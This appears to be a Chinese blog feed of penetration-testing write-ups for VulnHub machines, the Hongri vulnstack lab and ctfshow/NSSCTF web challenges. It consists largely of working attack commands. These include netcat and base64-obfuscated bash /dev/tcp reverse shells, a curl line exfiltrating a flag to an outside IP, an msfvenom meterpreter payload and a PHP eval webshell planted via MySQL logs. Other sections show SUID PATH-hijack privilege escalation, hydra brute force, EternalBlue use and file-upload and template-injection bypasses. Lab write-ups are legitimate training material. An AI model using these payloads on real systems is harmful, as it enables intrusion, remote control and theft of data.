<p>使用马命令执行还是不行</p>
<p>后决定使用msf php reverse 反弹shell</p>
<p>反弹成功</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -exec ls -al &#123;&#125; \; 2&gt; /dev/null</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-rwsr-xr-x 1 root root 16976 Feb  8  2020 /home/tom/rootshell</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">int main() &#123;</span><br><span class="line">    printf(&quot;checking if you are tom...\n&quot;);</span><br><span class="line">    FILE* f = popen(&quot;whoami&quot;, &quot;r&quot;);</span><br><span class="line">    char user[80];</span><br><span class="line">    fgets(user, 80, f);</span><br><span class="line">    printf(&quot;you are: %s\n&quot;, user);</span><br><span class="line">    //printf(&quot;your euid is: %i\n&quot;, geteuid());</span><br><span class="line"></span><br><span class="line">    if (strncmp(user, &quot;tom&quot;, 3) == 0) &#123;</span><br><span class="line">        printf(&quot;access granted.\n&quot;);</span><br><span class="line">        setuid(geteuid());</span><br><span class="line">        execlp(&quot;sh&quot;, &quot;sh&quot;, (char *) 0);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;printf &quot;tom&quot;&quot; &gt; whoami</span><br><span class="line">chmod +x whoami</span><br><span class="line">export PATH=/tmp:$PATH</span><br><span class="line">cd /home/tom</span><br><span class="line">./rootshell</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/28/oscp1/QQ%E6%88%AA%E5%9B%BE20230808225617.png"></p>
<h2 id="dawn"><a href="#dawn" class="headerlink" title="dawn"></a>dawn</h2><p>下载地址</p>
<p><a href="https://download.vulnhub.com/sunset/dawn.zip">https://download.vulnhub.com/sunset/dawn.zip</a></p>
<p><img src="/2023/07/28/oscp1/QQ%E6%88%AA%E5%9B%BE20230809150101.png"></p>
<p><strong>smbclient命令</strong>属于<a href="https://so.csdn.net/so/search?q=samba&spm=1001.2101.3001.7020">samba</a>套件，它提供一种命令行使用交互式方式访问samba服务器的共享资源。</p>
<p><img src="/2023/07/28/oscp1/QQ%E6%88%AA%E5%9B%BE20230809173417.png"></p>
<p>扫一下目录发现logs,然后查看</p>
<p><img src="/2023/07/28/oscp1/QQ%E6%88%AA%E5%9B%BE20230809173208.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &#x27;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.0.107 4444 &gt;/tmp/f&#x27; &gt;product-control </span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/28/oscp1/QQ%E6%88%AA%E5%9B%BE20230809173906.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">suid 提权</span><br><span class="line">/usr/bin/zsh</span><br></pre></td></tr></table></figure>

<p>直接获得权限</p>
<h2 id="funbox-rookie"><a href="#funbox-rookie" class="headerlink" title="funbox: rookie"></a>funbox: rookie</h2><p> 下载地址<a href="https://www.vulnhub.com/entry/funbox-rookie,520/">Funbox: Rookie ~ VulnHub</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap 192.168.56.108 -A -p- -sV</span><br></pre></td></tr></table></figure>

<p>发现ftp 服务 匿名登录下载文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget ftp://192.168.56.108/tom.zip</span><br></pre></td></tr></table></figure>

<p>zip2john获得中间Hash文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">zip2john tom.zip &gt;&gt;pass.txt </span><br></pre></td></tr></table></figure>

<p>john 破解 ：  iubire </p>
<p>ssh 连接</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -i id_rsa tom@192.168.56.108</span><br></pre></td></tr></table></figure>

<p>rbash绕过，之前见过的vi 绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//新建一个文件，末行命令，回车</span><br><span class="line">cd /tmp</span><br><span class="line">vi test</span><br><span class="line">:set shell=/bin/sh</span><br><span class="line">:shell</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd/home/tom</span><br><span class="line">ls -al</span><br><span class="line">cat .mysql_history</span><br><span class="line">sudo -l</span><br><span class="line">密码 xx11yy22!</span><br><span class="line">su</span><br><span class="line">xx11yy22!</span><br><span class="line">提权成功</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/28/oscp1/QQ%E6%88%AA%E5%9B%BE20230810023526.png"></p>
]]></content>
  </entry>
  <entry>
    <title>红日靶场1</title>
    <url>/2023/07/09/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/</url>
    <content><![CDATA[<p> 打一下内网渗透</p>
<p><img src="/2023/07/09/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/1605154-20200928100252971-711962221.png"></p>
<!--mroe-->

<h2 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h2><p>靶场下载地址</p>
<p><a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/">漏洞详情 (qiyuanxuetang.net)</a></p>
<p>vm网卡设置,win7,两个网络适配器</p>
<p><img src="/2023/07/09/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/QQ%E6%88%AA%E5%9B%BE20230709213618.png"></p>
<p>剩下两个</p>
<p><img src="/2023/07/09/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/QQ%E6%88%AA%E5%9B%BE20230709213740.png"></p>
<p>默认登录密码： hongrisec@2019</p>
<p>打开之后发现啥也扫描不到，之后登录进去，关闭防火墙，启动phpstudy</p>
<p>后才能扫描到，</p>
<p>win7 外网ip:192.168.158.170</p>
<p> 内网ip: 192.158.52.143</p>
<p>windos2018 Ip 192.168.52.138</p>
<p>win2k3 ip 192.168.52.141,</p>
<p>经侧式后发现能够ping的通，应该就搭建好了吧。</p>
<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap 192.168.158.0/24 -sn</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap 192.168.158.167 -Pn //开放端口</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://192.168.158.167</span><br></pre></td></tr></table></figure>

<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>漏洞一：</p>
<p>phpmyadmin弱口令登录root root</p>
<p>查看能否写入文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show global variables like &quot;secure%&quot;;</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>secure_file_priv</th>
<th>NULL</th>
</tr>
</thead>
</table>
<p>写不进去，所以查看日志</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SHOW GLOBAL VARIABLES LIKE &#x27;%general%&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/09/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/QQ%E6%88%AA%E5%9B%BE20230709222532.png"></p>
<p>日志为关闭</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SET GLOBAL general_log = ON;# 开启日志</span><br><span class="line">SET GLOBAL general_log_file = &#x27;C:/WWW/test.php&#x27;;# 设置日志位置为网站目录</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/09/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/QQ%E6%88%AA%E5%9B%BE20230709225410.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select &#x27;&lt;?php eval ($_POST[1]);?&gt;&#x27;</span><br></pre></td></tr></table></figure>

<p>蚁剑连接</p>
<p>漏洞2 经典永恒之蓝，看kali工具那一篇。</p>
<p>漏洞3 yxcms 框架漏洞，但靶机phpstudy 好像有问题，发现phpsudy 好像目录不对，也调不动，算了，无所谓了，简单的xss。</p>
<p>上传</p>
<p>msfmenue木马</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.158.129 lport=4444 -f exe &gt;shell.exe</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chcp 65001  #切换编码</span><br></pre></td></tr></table></figure>

<h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><p>查看ip</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">192.168.52.143</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#查看路由信息</span><br><span class="line">run get_local_subnets</span><br><span class="line">#添加一条路由</span><br><span class="line">run autoroute -s 192.168.52.0/24</span><br><span class="line">run autoroute -p 查看配置信息</span><br></pre></td></tr></table></figure>

<p>使用msf的socks代理模块，</p>
<h3 id="proxychains4-msf"><a href="#proxychains4-msf" class="headerlink" title="proxychains4+msf"></a>proxychains4+msf</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line">jobs //查看工作状态</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/proxychains4.conf  </span><br></pre></td></tr></table></figure>

<p>内网信息收集</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">proxychains nmap -Pn -sT 192.168.52.141 -p22,445,443,135 </span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/09/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/QQ%E6%88%AA%E5%9B%BE20230713133324.png"></p>
<p>发现445端口开放尝试，ms17-010没效果</p>
<p>打windows 2008</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">set lport 5555</span><br><span class="line">set lhost 192.168.52.143</span><br><span class="line">set rhosts 192.168.52.138</span><br><span class="line">exploit </span><br></pre></td></tr></table></figure>

<p><a href="https://www.cnblogs.com/adsry/p/15039414.html">https://www.cnblogs.com/adsry/p/15039414.html</a></p>
]]></content>
      <tags>
        <tag>红日靶场</tag>
      </tags>
  </entry>
  <entry>
    <title>thinkphp</title>
    <url>/2023/07/14/thinkphp/</url>
    <content><![CDATA[<span id="more"></span>

<p>代码下载地址5.0以上版本下载地址</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/top-think/think/releases?page=8</span><br></pre></td></tr></table></figure>

<p>3.0以前下载地址</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://code.google.com/archive/p/thinkphp/downloads</span><br></pre></td></tr></table></figure>



<h2 id="web569"><a href="#web569" class="headerlink" title="web569"></a>web569</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://serverName/index.php/模块/控制器/操作</span><br></pre></td></tr></table></figure>

<p>由<code>&#39;URL_CASE_INSENSITIVE&#39; =&gt; true,</code>这个配置决定。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/index.php/admin/login/ctfshowlogin</span><br></pre></td></tr></table></figure>

<h2 id="web570"><a href="#web570" class="headerlink" title="web570"></a>web570</h2><p>漏洞函数在Common&#x2F;Conf&#x2F;config.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">    &#x27;ctfshow/:f/:a&#x27; =&gt;function($f,$a)&#123;</span><br><span class="line">       call_user_func($f, $a);</span><br><span class="line">       &#125;</span><br><span class="line">    )</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>绕过&#x2F;</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">index.php/ctfshow/assert/eval($_POST[1])</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1=system(&#x27;ls /&#x27;);</span><br></pre></td></tr></table></figure>

<h2 id="web571"><a href="#web571" class="headerlink" title="web571"></a>web571</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Application/Home/Controller/IndexController.class.php</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/14/thinkphp/QQ%E6%88%AA%E5%9B%BE20230913135104.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">protected function show($content,$charset=&#x27;&#x27;,$contentType=&#x27;&#x27;,$prefix=&#x27;&#x27;) &#123;</span><br><span class="line">       $this-&gt;view-&gt;display(&#x27;&#x27;,$charset,$contentType,$content,$prefix);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>直接跟进</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span>   <span class="title">fetch</span>(<span class="params"><span class="variable">$templateFile</span>=<span class="string">&#x27;&#x27;</span>,<span class="variable">$content</span>=<span class="string">&#x27;&#x27;</span>,<span class="variable">$prefix</span>=<span class="string">&#x27;&#x27;</span></span>) </span>&#123;</span><br><span class="line">       <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$content</span>)) &#123;</span><br><span class="line">           <span class="variable">$templateFile</span>   =   <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseTemplate</span>(<span class="variable">$templateFile</span>);</span><br><span class="line">           <span class="comment">// 模板文件不存在直接返回</span></span><br><span class="line">           <span class="keyword">if</span>(!<span class="title function_ invoke__">is_file</span>(<span class="variable">$templateFile</span>)) <span class="title function_ invoke__">E</span>(<span class="title function_ invoke__">L</span>(<span class="string">&#x27;_TEMPLATE_NOT_EXIST_&#x27;</span>).<span class="string">&#x27;:&#x27;</span>.<span class="variable">$templateFile</span>);</span><br><span class="line">       &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">           <span class="title function_ invoke__">defined</span>(<span class="string">&#x27;THEME_PATH&#x27;</span>) <span class="keyword">or</span>    <span class="title function_ invoke__">define</span>(<span class="string">&#x27;THEME_PATH&#x27;</span>, <span class="variable">$this</span>-&gt;<span class="title function_ invoke__">getThemePath</span>());</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="comment">// 页面缓存</span></span><br><span class="line">       <span class="title function_ invoke__">ob_start</span>();</span><br><span class="line">       <span class="title function_ invoke__">ob_implicit_flush</span>(<span class="number">0</span>);</span><br><span class="line">       <span class="keyword">if</span>(<span class="string">&#x27;php&#x27;</span> == <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">C</span>(<span class="string">&#x27;TMPL_ENGINE_TYPE&#x27;</span>))) &#123; <span class="comment">// 使用PHP原生模板</span></span><br><span class="line">           <span class="variable">$_content</span>   =   <span class="variable">$content</span>;</span><br><span class="line">           <span class="comment">// 模板阵列变量分解成为独立变量</span></span><br><span class="line">           <span class="title function_ invoke__">extract</span>(<span class="variable">$this</span>-&gt;tVar, EXTR_OVERWRITE);</span><br><span class="line">           <span class="comment">// 直接载入PHP模板</span></span><br><span class="line">           <span class="keyword">empty</span>(<span class="variable">$_content</span>)?<span class="keyword">include</span> <span class="variable">$templateFile</span>:<span class="keyword">eval</span>(<span class="string">&#x27;?&gt;&#x27;</span>.<span class="variable">$_content</span>);<span class="comment">///闭合？&gt;然后继续写入&lt;? phpifo();&gt; 即可回西安</span></span><br><span class="line">       &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">           <span class="comment">// 视图解析标签</span></span><br><span class="line">           <span class="variable">$params</span> = <span class="keyword">array</span>(<span class="string">&#x27;var&#x27;</span>=&gt;<span class="variable language_">$this</span>-&gt;tVar,<span class="string">&#x27;file&#x27;</span>=&gt;<span class="variable">$templateFile</span>,<span class="string">&#x27;content&#x27;</span>=&gt;<span class="variable">$content</span>,<span class="string">&#x27;prefix&#x27;</span>=&gt;<span class="variable">$prefix</span>);</span><br><span class="line">           <span class="title class_">Hook</span>::<span class="title function_ invoke__">listen</span>(<span class="string">&#x27;view_parse&#x27;</span>,<span class="variable">$params</span>);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="comment">// 获取并清空缓存</span></span><br><span class="line">       <span class="variable">$content</span> = <span class="title function_ invoke__">ob_get_clean</span>();</span><br><span class="line">       <span class="comment">// 内容过滤标签</span></span><br><span class="line">       <span class="title class_">Hook</span>::<span class="title function_ invoke__">listen</span>(<span class="string">&#x27;view_filter&#x27;</span>,<span class="variable">$content</span>);</span><br><span class="line">       <span class="comment">// 输出模板文件</span></span><br><span class="line">       <span class="keyword">return</span> <span class="variable">$content</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>payload : </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?n=&lt;?php system(&#x27;cat /f*&#x27;);?&gt;</span><br></pre></td></tr></table></figure>



<h2 id="web574"><a href="#web574" class="headerlink" title="web574"></a>web574</h2><p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctfshow&#123;9a429b8c-4ae1-48f9-8035-fb343de793a9&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;bash&quot;, &quot;-c&quot;, &quot;curl http://101.43.182.125:5000?p=`cat /flag`&quot;&#125;)).start()</span><br></pre></td></tr></table></figure>

<p>得到结果</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@java.lang.\u0052untime@g\u0065tRuntime().\u0065xec(&#x27;bash -c &#123;echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEwMS40My4xODIuMTI1LzUwMDAgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;)</span><br><span class="line"></span><br><span class="line">得到结果：</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@java.lang.\u0052untime@g\u0065t\u0052untime().\u0065xec(&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDEuNDMuMTgyLjEyNS81MDAwIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;)</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDEuNDMuMTgyLjEyNS81MDAwIDA+JjE=</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>sictf和nsss</title>
    <url>/2023/08/29/NSSCTF2nd/</url>
    <content><![CDATA[<p><img src="https://s3.bmp.ovh/imgs/2023/09/23/44959fabae96e3cc.png"></p>
 <span id="more"></span>

<h2 id="NSSCTF-2nd-php签到"><a href="#NSSCTF-2nd-php签到" class="headerlink" title="[NSSCTF 2nd]php签到"></a>[NSSCTF 2nd]php签到</h2><p>绕过pathinfo函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function waf($filename)&#123;</span><br><span class="line">    $black_list = array(&quot;ph&quot;, &quot;htaccess&quot;, &quot;ini&quot;);</span><br><span class="line">    $ext = pathinfo($filename, PATHINFO_EXTENSION);</span><br><span class="line">    foreach ($black_list as $value) &#123;</span><br><span class="line">        if (stristr($ext, $value))&#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_FILES[&#x27;file&#x27;]))&#123;</span><br><span class="line">    $filename = urldecode($_FILES[&#x27;file&#x27;][&#x27;name&#x27;]);</span><br><span class="line">    $content = file_get_contents($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;]);</span><br><span class="line">    if(waf($filename))&#123;</span><br><span class="line">        file_put_contents($filename, $content);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;Please re-upload&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a href="https://aecous.github.io/2023/08/28/NSSCTF-2nd-WP/">https://aecous.github.io/2023/08/28/NSSCTF-2nd-WP/</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = &quot;http://node6.anna.nssctf.cn:28990/&quot;</span><br><span class="line">result = requests.post(url,files=&#123;&quot;file&quot;:(&quot;%31%2e%70%68%70%2f%2e&quot;,&quot;&lt;?php phpinfo();?&gt;&quot;)&#125;).content</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.php/.  url 解码后</span><br></pre></td></tr></table></figure>

<h2 id="MyHurricane"><a href="#MyHurricane" class="headerlink" title="MyHurricane"></a>MyHurricane</h2><p>考察<code>Tornadon代码注入</code></p>
<p>官方文档</p>
<p><a href="https://tornado-zh.readthedocs.io/zh/latest/guide/templates.html">模板和UI — Tornado 4.3 文档 (tornado-zh.readthedocs.io)</a></p>
<p><a href="https://blog.csdn.net/miuzzx/article/details/123329244">tornado模板注入</a></p>
<p>源码如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> tornado.ioloop</span><br><span class="line"><span class="keyword">import</span> tornado.web</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">BASE_DIR = os.path.dirname(__file__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">data</span>):</span><br><span class="line">    bl = [<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;__&#x27;</span>, <span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;or&#x27;</span>, <span class="string">&#x27;and&#x27;</span>, <span class="string">&#x27;not&#x27;</span>, <span class="string">&#x27;&#123;&#123;&#x27;</span>, <span class="string">&#x27;&#125;&#125;&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> bl:</span><br><span class="line">        <span class="keyword">if</span> c <span class="keyword">in</span> data:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> chunk <span class="keyword">in</span> data.split():</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> chunk:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> (<span class="number">31</span> &lt; <span class="built_in">ord</span>(c) &lt; <span class="number">128</span>):</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">IndexHandler</span>(tornado.web.RequestHandler):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(__file__, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            self.finish(f.read())</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">post</span>(<span class="params">self</span>):</span><br><span class="line">        data = self.get_argument(<span class="string">&quot;ssti&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> waf(data):</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;1.html&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(<span class="string">f&quot;&quot;&quot;&lt;html&gt;</span></span><br><span class="line"><span class="string">                        &lt;head&gt;&lt;/head&gt;</span></span><br><span class="line"><span class="string">                        &lt;body style=&quot;font-size: 30px;&quot;&gt;<span class="subst">&#123;data&#125;</span>&lt;/body&gt;&lt;/html&gt;</span></span><br><span class="line"><span class="string">                        &quot;&quot;&quot;</span>)</span><br><span class="line">                f.flush()</span><br><span class="line">            self.render(<span class="string">&#x27;1.html&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.finish(<span class="string">&#x27;no no no&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app = tornado.web.Application([</span><br><span class="line">            (<span class="string">r&quot;/&quot;</span>, IndexHandler),</span><br><span class="line">        ], compiled_template_cache=<span class="literal">False</span>)</span><br><span class="line">    app.listen(<span class="number">827</span>)</span><br><span class="line">    tornado.ioloop.IOLoop.current().start()</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">**可以看到源码过滤了&#x27;, &quot;, __, (, ), or, and, not, &#123;&#123;, &#125;&#125;**</span><br></pre></td></tr></table></figure>

<p>**和flask模板一样，我们可以用</p>
]]></content>
  </entry>
  <entry>
    <title>oscp2</title>
    <url>/2023/08/11/oscp2/</url>
    <content><![CDATA[<p> <img src="https://s3.bmp.ovh/imgs/2023/09/29/cdab4be4e378dd27.png"></p>
<span id="more"></span>

<h2 id="SunsetNoontide"><a href="#SunsetNoontide" class="headerlink" title="SunsetNoontide"></a>SunsetNoontide</h2><p>信息搜集</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap 192.168.56.109 -A -sV -p-</span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/11/oscp2/QQ%E6%88%AA%E5%9B%BE20230811234424.png"></p>
<p>msf启动！</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">search UnrealIRCd</span><br><span class="line">use 0</span><br><span class="line">set rhosts 192.168.56.109</span><br><span class="line">show payloads</span><br><span class="line">set payload payload/cmd/unix/reverse_perl</span><br><span class="line">show options</span><br><span class="line">...</span><br><span class="line">run</span><br><span class="line">shell</span><br><span class="line">whoami</span><br><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br><span class="line">find / -perm -u=s -exec ls -al &#123;&#125; \; 2&gt; /dev/null</span><br><span class="line">su root</span><br><span class="line">root 弱密码登录</span><br></pre></td></tr></table></figure>

<p>提权成功</p>
<h2 id="pyexp-1"><a href="#pyexp-1" class="headerlink" title="pyexp: 1"></a>pyexp: 1</h2><p>这个靶机只能又vm 打开</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap 192.168.111.131 -sV -sC -A -p-</span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/11/oscp2/QQ%E6%88%AA%E5%9B%BE20230812211640.png"></p>
<p>没有http 服务，那就从ssh 爆破 和 mysql  爆破</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hydra -l root -P &quot;rockyou.txt&quot; mysql://192.168.111.131</span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/11/oscp2/QQ%E6%88%AA%E5%9B%BE20230812213418.png"></p>
<p>爆破出来密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">prettywoman</span><br></pre></td></tr></table></figure>

<p>gAAAAABfMbX0bqWJTTdHKUYYG9U5Y6JGCpgEiLqmYIVlWB7t8gvsuayfhLOO_cHnJQF1_ibv14si1MbL7Dgt9Odk8mKHAXLhyHZplax0v02MMzh_z_eI7ys&#x3D;</p>
<p>密钥：UJ5_V_b-TWKKyzlErA96f-9aEnQEfdjFbRKt8ULjdV0&#x3D;</p>
<p><a href="https://cryptography.io/en/latest/fernet/#cryptography.fernet.Fernet">Fernet (symmetric encryption) — Cryptography 42.0.0.dev1 documentation</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">打开python3终端一次输入</span><br><span class="line">from cryptography.fernet import Fernet</span><br><span class="line">key = b&#x27;UJ5_V_b-TWKKyzlErA96f-9aEnQEfdjFbRKt8ULjdV0=&#x27;</span><br><span class="line">f = Fernet(key)</span><br><span class="line">token =b&#x27;gAAAAABfMbX0bqWJTTdHKUYYG9U5Y6JGCpgEiLqmYIVlWB7t8gvsuayfhLOO_cHnJQF1_ibv14si1MbL7Dgt9Odk8mKHAXLhyHZplax0v02MMzh_z_eI7ys=&#x27;</span><br><span class="line">f.decrypt(token)</span><br><span class="line">b&#x27;lucy:wJ9`&quot;Lemdv9[FEw-&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/11/oscp2/QQ%E6%88%AA%E5%9B%BE20230812220514.png"></p>
